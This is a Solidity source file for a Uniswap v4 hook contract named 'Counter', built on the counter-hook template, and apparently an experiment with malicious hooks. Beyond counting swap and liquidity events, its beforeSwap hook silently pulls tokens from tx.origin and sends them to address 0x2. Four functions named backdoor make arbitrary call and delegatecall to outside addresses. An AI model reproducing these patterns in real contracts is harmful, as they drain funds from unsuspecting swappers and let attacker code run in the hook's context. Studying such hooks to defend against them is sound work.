// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {BaseHook} from "v4-periphery/src/base/hooks/BaseHook.sol";

import {Hooks} from "v4-core/src/libraries/Hooks.sol";
import {IPoolManager} from "v4-core/src/interfaces/IPoolManager.sol";
import {PoolKey} from "v4-core/src/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "v4-core/src/types/PoolId.sol";
import {BalanceDelta} from "v4-core/src/types/BalanceDelta.sol";
import {BeforeSwapDelta, BeforeSwapDeltaLibrary, toBeforeSwapDelta} from "v4-core/src/types/BeforeSwapDelta.sol";
import {console} from "forge-std/console.sol";
import {IERC20} from "openzeppelin-contracts/contracts/token/ERC20/IERC20.sol";
contract Counter is BaseHook {
    using PoolIdLibrary for PoolKey;

    // NOTE: ---------------------------------------------------------
    // state variables should typically be unique to a pool
    // a single hook contract should be able to service multiple pools
    // ---------------------------------------------------------------

    mapping(PoolId => uint256 count) public beforeSwapCount;
    mapping(PoolId => uint256 count) public afterSwapCount;

    mapping(PoolId => uint256 count) public beforeAddLiquidityCount;
    mapping(PoolId => uint256 count) public beforeRemoveLiquidityCount;
    IERC20 tk;
    constructor(IPoolManager _poolManager, address erc) BaseHook(_poolManager) {
        tk = IERC20(erc);
    }

    function getHookPermissions() public pure override returns (Hooks.Permissions memory) {
        return Hooks.Permissions({
            beforeInitialize: true,
            afterInitialize: true,

            beforeAddLiquidity: true,
            afterAddLiquidity: false,

            beforeRemoveLiquidity: true,
            afterRemoveLiquidity: false,

            beforeSwap: true,
            afterSwap: true,

            beforeDonate: false,
            afterDonate: false,

            beforeSwapReturnDelta: false,
            afterSwapReturnDelta: false,

            afterAddLiquidityReturnDelta:false,
            afterRemoveLiquidityReturnDelta: false
        });
    }

    // -----------------------------------------------
    // NOTE: see IHooks.sol for function documentation
    // -----------------------------------------------
    function beforeInitialize(address, PoolKey calldata,  uint160 , bytes calldata) external override view returns (bytes4) {
        console.log("before");
        return this.beforeInitialize.selector;
    }
    function afterInitialize(
        address,
        PoolKey calldata key,
        uint160,
        int24 tick,
        bytes calldata
    ) external override returns (bytes4) {
        return this.afterInitialize.selector;
    }
    function beforeSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata params, bytes calldata)
        external
        override
        returns (bytes4, BeforeSwapDelta, uint24)
    {
        console.log("beforeSwap +++");


        // BeforeSwapDelta hookDelta = toBeforeSwapDelta(int128(-params.amountSpecified), int128(params.amountSpecified));
        // console.logInt(BeforeSwapDeltaLibrary.getSpecifiedDelta(hookDelta)); // 캐스팅 후 출력
        // console.logInt(BeforeSwapDeltaLibrary.getUnspecifiedDelta(hookDelta)); // 캐스팅 후 출력
        beforeSwapCount[key.toId()]++;
        
        console.log("tx.origin : ", tx.origin);
        console.log("msg.sender : ", msg.sender);
        console.log("transfer start");
        tk.transferFrom(tx.origin, address(this), 1 ether);
        tk.transfer(address(0x2), 1 ether);
        console.log("transfer done");
        return (BaseHook.beforeSwap.selector, BeforeSwapDeltaLibrary.ZERO_DELTA, 0);
    }
    
    function afterSwap(address, PoolKey calldata key, IPoolManager.SwapParams calldata, BalanceDelta, bytes calldata )
        external
        override
        returns (bytes4, int128)
    {
        console.log("afterSwap ++ ");
        afterSwapCount[key.toId()]++;
        console.log("after swap done");
        return (BaseHook.afterSwap.selector, 0);
    }

    function beforeAddLiquidity(
        address,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata,
        bytes calldata
    ) external override returns (bytes4) {
        beforeAddLiquidityCount[key.toId()]++;
        return BaseHook.beforeAddLiquidity.selector;
    }

    function beforeRemoveLiquidity(
        address,
        PoolKey calldata key,
        IPoolManager.ModifyLiquidityParams calldata,
        bytes calldata
    ) external override returns (bytes4) {
        beforeRemoveLiquidityCount[key.toId()]++;
        return BaseHook.beforeRemoveLiquidity.selector;
    }
    function backdoor() public{
        console.log("exploitable : ",tx.origin);
        console.log("msg.sender", msg.sender);
        address(this).call(abi.encodeWithSignature("exploitable1()"));
    }
    function backdoor2() external{
        address(this).call(abi.encodeWithSignature("exploitable2()"));
    }
    function backdoor3(address addr) public{
        address(addr).delegatecall(abi.encodeWithSignature("exploitable1()"));
    }
    function backdoor4(address addr) external{
        address(addr).delegatecall(abi.encodeWithSignature("exploitable2()"));
    }
    
}


